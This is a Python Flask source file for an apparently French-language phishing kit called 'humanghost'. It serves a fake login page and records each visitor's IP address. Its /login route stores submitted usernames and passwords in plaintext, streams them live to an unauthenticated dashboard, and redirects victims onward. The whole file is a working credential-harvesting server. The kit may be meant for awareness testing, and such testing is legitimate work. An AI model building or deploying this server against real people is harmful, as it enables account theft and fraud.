from flask import Flask, render_template_string, request, redirect, render_template, jsonify
from flask_socketio import SocketIO
from .models import db, Campaign, Event  # Importe les modèles
import os
from datetime import datetime
import threading

socketio = SocketIO()

def create_app(config):
    app = Flask(__name__, template_folder=os.path.abspath('templates'))
    app.config['SECRET_KEY'] = 'humanghost-secret-key!'
    # Configuration de la base de données SQLite
    app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///humanghost.db'
    app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

    # Lie l'instance de la base de données à l'application
    db.init_app(app)

    with app.app_context():
        # Crée les tables si elles n'existent pas
        db.create_all()

        # Crée une nouvelle campagne à chaque lancement du serveur (pour la démo)
        # Dans une version plus avancée, on la gérerait via la CLI
        current_campaign = Campaign(name=config.get('name', 'Campagne sans nom'))
        db.session.add(current_campaign)
        db.session.commit()
        app.config['CAMPAIGN_ID'] = current_campaign.id

    @app.route("/")
    def index():
        campaign_id = app.config['CAMPAIGN_ID']
        new_event = Event(
            campaign_id=campaign_id,
            ip_address=request.remote_addr,
            event_type='Visit'
        )
        db.session.add(new_event)
        db.session.commit()
        socketio.emit('update', new_event_to_dict(new_event))
        
        with open(os.path.join(app.template_folder, config['server']['template']), "r") as f:
            return render_template_string(f.read())

    @app.route("/login", methods=['POST'])
    def login():
        campaign_id = app.config['CAMPAIGN_ID']
        username = request.form.get('username')
        password = request.form.get('password')
        
        new_event = Event(
            campaign_id=campaign_id,
            ip_address=request.remote_addr,
            event_type='Credential Submission',
            details=f"Username: {username}, Password: {password}"
        )
        db.session.add(new_event)
        db.session.commit()
        socketio.emit('update', new_event_to_dict(new_event))
            
        return redirect(config['server']['redirect_url'])

    @app.route("/dashboard")
    def dashboard():
        # Le tableau de bord affiche maintenant toutes les campagnes
        campaigns = Campaign.query.order_by(Campaign.created_at.desc()).all()
        return render_template("dashboard.html", campaigns=campaigns)
        
    @app.route("/api/campaign/<int:campaign_id>/events")
    def get_events(campaign_id):
        # API pour que le tableau de bord récupère les événements d'une campagne
        events = Event.query.filter_by(campaign_id=campaign_id).order_by(Event.timestamp.desc()).all()
        return jsonify([new_event_to_dict(e) for e in events])

    socketio.init_app(app)
    return app

def new_event_to_dict(event):
    """Utilitaire pour convertir un objet Event en dictionnaire."""
    return {
        'timestamp': event.timestamp.strftime('%Y-%m-%d %H:%M:%S'),
        'type': 'credential' if 'Credential' in event.event_type else 'event',
        'event': event.event_type,
        'details': event.details or f"IP: {event.ip_address}"
    }

# La fonction run_server_in_thread ne change pas
def run_server_in_thread(config):
    app = create_app(config)
    host = config['server'].get('host', '0.0.0.0')
    port = config['server'].get('port', 5000)
    print(f"[*] Faux site accessible sur http://{host}:{port}")
    print(f"[*] Tableau de bord accessible sur http://{host}:{port}/dashboard")
    server_thread = threading.Thread(target=socketio.run, args=(app,), kwargs={'host': host, 'port': port, 'allow_unsafe_werkzeug': True})
    server_thread.daemon = True
    server_thread.start()
    return server_thread
